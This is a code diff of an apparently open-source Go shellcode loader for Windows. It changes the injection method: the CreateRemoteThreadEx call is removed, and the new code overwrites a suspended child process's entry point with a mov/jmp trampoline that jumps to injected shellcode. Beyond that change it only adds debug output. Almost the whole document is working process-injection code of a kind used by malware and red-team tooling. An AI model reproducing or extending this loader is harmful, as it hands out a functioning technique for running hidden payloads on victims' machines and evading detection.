@@ -47,7 +47,6 @@ func main() {
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
 	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
 
 	// Create anonymous pipe for STDIN
@@ -157,6 +156,9 @@ func main() {
 	if *verbose {
 		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", procInfo.ProcessId))
 	}
+	if *debug {
+		fmt.Println(fmt.Sprintf("[DEBUG]Shellcode address: 0x%x", addr))
+	}
 
 	// Write shellcode into child process memory
 	if *debug {
@@ -181,19 +183,7 @@ func main() {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
-	}
-
-	// Create a thread in the remote process
-	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", procInfo.ProcessId))
-	}
-	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
-	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", procInfo.ProcessId))
+		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
 	}
 
 	// Query the child process and find its image base address from its Process Environment Block (PEB)
@@ -294,7 +284,7 @@ func main() {
 	}
 	if *debug {
 		fmt.Println(fmt.Sprintf("[DEBUG]PEB: %+v", peb))
-		fmt.Println(fmt.Sprintf("[DEBUG]Image base address: 0x%x", peb.ImageBaseAddress))
+		fmt.Println(fmt.Sprintf("[DEBUG]PEB ImageBaseAddress: 0x%x", peb.ImageBaseAddress))
 	}
 
 	// Read the child program's DOS header and validate it is a MZ executable
@@ -340,12 +330,6 @@ func main() {
 		fmt.Println(fmt.Sprintf("[DEBUG]PE header offset: 0x%x", dosHeader.LfaNew))
 	}
 
-	/*
-		b := make([]byte, 2)
-		binary.LittleEndian.PutUint16(b, dosHeader.Magic)
-		fmt.Println(fmt.Sprintf("[DEBUG]Magic Header 2: %s", string(b)))
-	*/
-
 	// 23117 is the LittleEndian unsigned base10 representation of MZ
 	// 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
 	if dosHeader.Magic != 23117 {
@@ -354,7 +338,7 @@ func main() {
 
 	// Read the child process's PE header signature to validate it is a PE
 	if *debug {
-		fmt.Println("[DEBUG]Calling ReadProcessMemory for PE Signature")
+		fmt.Println("[DEBUG]Calling ReadProcessMemory for PE Signature...")
 	}
 	var Signature uint32
 	var readBytes3 int32
@@ -401,7 +385,7 @@ func main() {
 	}
 
 	if *debug {
-		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_FILE_HEADER")
+		fmt.Println("[DEBUG]Calling ReadProcessMemory for IMAGE_FILE_HEADER...")
 	}
 	var peHeader IMAGE_FILE_HEADER
 	var readBytes4 int32
@@ -422,7 +406,6 @@ func main() {
 		}
 	}
 	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]PE HEADER ADDRESS: 0x%x", peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)))
 		fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_FILE_HEADER: %+v", peHeader))
 		fmt.Println(fmt.Sprintf("[DEBUG]Machine: 0x%x", peHeader.Machine))
 	}
@@ -594,17 +577,19 @@ func main() {
 	if *debug {
 		if peHeader.Machine == 332 { // 0x14c
 			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER32: %+v", optHeader32))
+			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader32.ImageBase))
 			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader32.AddressOfEntryPoint))
-			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint: 0x%x", peb.ImageBaseAddress+uintptr(optHeader32.AddressOfEntryPoint)))
+			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader32.AddressOfEntryPoint)))
 		}
 		if peHeader.Machine == 34404 { // 0x8664
 			fmt.Println(fmt.Sprintf("[DEBUG]IMAGE_OPTIONAL_HEADER64: %+v", optHeader64))
+			fmt.Println(fmt.Sprintf("\t[DEBUG]ImageBase: 0x%x", optHeader64.ImageBase))
 			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (relative): 0x%x", optHeader64.AddressOfEntryPoint))
-			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint: 0x%x", peb.ImageBaseAddress+uintptr(optHeader64.AddressOfEntryPoint)))
+			fmt.Println(fmt.Sprintf("\t[DEBUG]AddressOfEntryPoint (absolute): 0x%x", peb.ImageBaseAddress+uintptr(optHeader64.AddressOfEntryPoint)))
 		}
 	}
 
-	// Overwrite AddressofEntryPoint with thread for new process
+	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
 	var ep uintptr
 	if peHeader.Machine == 34404 { // 0x8664 x64
 		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
@@ -614,13 +599,34 @@ func main() {
 		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
 	}
 
-	epBuffer := make([]byte, unsafe.Sizeof(addr))
-	binary.LittleEndian.PutUint32(epBuffer, uint32(addr))
+	var epBuffer []byte
+	var shellcodeAddressBuffer []byte
+	// x86 - 0xb8 = mov eax
+	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
+	if peHeader.Machine == 34404 { // 0x8664 x64
+		epBuffer = append(epBuffer, byte(0x48))
+		epBuffer = append(epBuffer, byte(0xb8))
+		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
+		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
+		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
+	} else if peHeader.Machine == 332 { // 0x14c x86
+		epBuffer = append(epBuffer, byte(0xb8))
+		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
+		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
+		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
+	} else {
+		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
+	}
+
+	// 0xff ; 0xe0 = jmp [r|e]ax
+	epBuffer = append(epBuffer, byte(0xff))
+	epBuffer = append(epBuffer, byte(0xe0))
 
 	if *debug {
-		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory to overwrite AddressofEntryPoint at 0x%x with 0x%x...", ep, addr))
+		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory to overwrite AddressofEntryPoint at 0x%x with trampoline: 0x%x...", ep, epBuffer))
 	}
-	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), unsafe.Sizeof(addr))
+
+	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
 
 	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2.Error()))
@@ -637,14 +643,23 @@ func main() {
 	if errResumeThread != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
 	}
+	if *verbose {
+		fmt.Println("[+]Process resumed and shellcode executed")
+	}
 
 	// Close the handle to the child process
+	if *debug {
+		fmt.Println("[DEBUG]Calling CloseHandle on child process...")
+	}
 	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
 	if errCloseProcHandle != nil {
 		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
 	}
 
 	// Close the hand to the child process thread
+	if *debug {
+		fmt.Println("[DEBUG]Calling CloseHandle on child process thread...")
+	}
 	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
 	if errCloseThreadHandle != nil {
 		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
